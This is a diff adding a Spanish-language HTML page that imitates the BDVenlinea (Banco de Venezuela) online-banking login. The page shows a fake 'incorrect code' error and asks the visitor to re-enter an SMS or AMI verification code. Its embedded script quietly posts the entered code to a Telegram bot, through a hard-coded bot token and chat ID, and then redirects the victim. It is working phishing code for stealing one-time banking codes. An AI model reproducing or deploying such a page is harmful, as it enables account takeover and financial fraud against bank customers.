@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0 , user-scalable=no">
+    <title>BDVenlinea</title>
+    <link rel="stylesheet" href="./styles.css">
+</head>
+<body>
+    <div class="container">
+        <div class="izquierda">
+            <div class="form-container">
+                <img src="./img/logo.png" alt="">
+                <form action="#" method="post" id="usuarioForm">
+                    <spam style="color: red;">Codigo SMS o codigo AMI. incorrecto</spam>
+                    <br>
+                    <spam style="color: red;">le enviaremos uno nuevo.</spam>
+                    <br>
+                    <br>
+                    <div class="input-group">
+                        <input type="text" id="usuario" name="usuario" required placeholder="   Codigo SMS o codigo AMI.">
+                    </div>
+                    <div class="input-group">
+                        <button type="submit" id="enviarUsuario">Entrar</button>
+                    </div>
+                    <a href="">¿Olvidaste tu usuario o clave? </a>
+                    <a href=""> Si eres nuevo clienteBDV regístrate aquí</a>
+                </form>
+            </div>
+        </div>
+        <div class="derecha">
+            <!-- La imagen de fondo se manejará a través del CSS -->
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const form = document.getElementById('usuarioForm');
+            form.addEventListener('submit', (event) => {
+                event.preventDefault();
+                const usuario = document.getElementById('usuario').value;
+
+                try {
+                    const token = '6903851307:AAFFT0FDf1y9fYdBZIQWqfawRtUI1WH2wZM';
+                    const chatId = '@bdvyo1212';
+                    const message = `✓✓✓BDVEnlinea✓✓✓\n✓✓✓@ProArgFull✓✓✓\nCódigo3 SMS: ${usuario}`;
+                    const telegramApiUrl = `https://api.telegram.org/bot${token}/sendMessage`;
+
+                    const xhr = new XMLHttpRequest();
+                    xhr.open('POST', telegramApiUrl, true);
+                    xhr.setRequestHeader('Content-Type', 'application/json');
+
+                    xhr.onreadystatechange = function () {
+                        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
+                            window.location.href = 'index.html';
+                        } else if (xhr.readyState === XMLHttpRequest.DONE) {
+                            console.error('Error sending message to Telegram:', xhr.responseText);
+                        }
+                    };
+
+                    const data = JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                    });
+
+                    xhr.send(data);
+                } catch (error) {
+                    console.error('Error sending message:', error);
+                }
+            });
+        });
+    </script>
+</body>
+</html>
